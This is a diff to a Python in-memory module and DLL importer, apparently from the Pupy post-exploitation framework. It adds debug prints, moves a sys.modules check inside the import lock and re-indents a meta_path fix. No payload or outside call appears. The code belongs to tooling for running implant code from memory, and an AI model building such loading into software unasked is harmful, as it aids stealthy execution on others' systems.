@@ -381,8 +381,9 @@ def load_dll(name, buf=None):
             cleanup_name = True
         else:
             return None
-
+    dprint("calling load_dll(name={}, buflen={}, buf0={}, buf1={})", name, len(buf), buf[0], buf[1]) 
     handle = _load_dll(name, buf)
+    dprint("load_dll() handle={}",handle)
     if handle:
         dlls[name] = handle
 
@@ -450,7 +451,7 @@ def make_module(fullname, path=None, is_pkg=False, mod=None):
         #mod = imp.new_module(fullname)
         spec = imputil.spec_from_loader(fullname, loader=None)
         mod = imputil.module_from_spec(spec)
-
+    dprint("make_module: %s %s %s"%(fullname, path, mod))
     mod.__name__ = str(fullname)
     mod.__file__ = str(
         'pupy://{}'.format(path or fullname + '.py')
@@ -586,7 +587,9 @@ class PupyPackageLoader(object):
                     self.extension))
 
         except Exception as e:
+            dprint('Error loading package {} ({} pkg={}): {}',fullname, self.path, self.is_pkg, e)
             if fullname in sys.modules:
+                dprint("Error ! %s : deleting from modules : %s"%(e,fullname))
                 del sys.modules[fullname]
 
             remote_error(
@@ -599,7 +602,6 @@ class PupyPackageLoader(object):
             self.contents = None
             _imp.release_lock()
             gc.collect()
-
         return sys.modules[fullname]
 
 
@@ -714,19 +716,19 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
                 yield first, True
 
     def find_module(self, fullname, path=None, second_pass=False):
-        dprint('Find module')
         if fullname.startswith('exposed_'):
             return None
 
         fullname = self._rename_aliased(fullname)
 
-        if fullname in sys.modules:
-            return DummyPackageLoader(fullname)
-
-        dprint('Find module: {}/{}'.format(fullname, second_pass))
 
         if not second_pass:
             _imp.acquire_lock()
+        if fullname in sys.modules:
+            dprint('found module in sys.modules: %s'%fullname)
+            return DummyPackageLoader(fullname)
+
+        dprint('Find module: {}/{}'.format(fullname, second_pass))
 
         selected = None
 
@@ -816,6 +818,7 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
 
             if not second_pass:
                 _imp.release_lock()
+                pass
 
             gc.collect()
 
@@ -861,20 +864,23 @@ def load_pupyimporter(stdlib=None):
         dprint('Install pupyimporter (standalone)')
         sys.path = ["pupy://"]
         sys.path_hooks = [PupyPackageFinder]
-        #sys.meta_path = [PupyPackageFinder("pupy://")]
+
+        dprint("meta_path: %s"%sys.meta_path)
+        dprint("path_hooks: %s"%sys.path_hooks)
+        dprint("path: %s"%sys.path)
 
     else:
         dprint('Install pupyimporter + local packages')
         #sys.meta_path=[]
         sys.path.insert(0, 'pupy://')
         sys.path_hooks.insert(0, PupyPackageFinder)
-    try:
-        import _frozen_importlib_external
-        # fix some missing default python meta_path, for instance with pyoxidizer
-        if _frozen_importlib_external.PathFinder not in sys.meta_path:
-            sys.meta_path.append(_frozen_importlib_external.PathFinder)
-    except:
-        pass
+        try:
+            import _frozen_importlib_external
+            # fix some missing default python meta_path, for instance with pyoxidizer
+            if _frozen_importlib_external.PathFinder not in sys.meta_path:
+                sys.meta_path.append(_frozen_importlib_external.PathFinder)
+        except:
+            pass
 
     sys.path_importer_cache.clear()
 
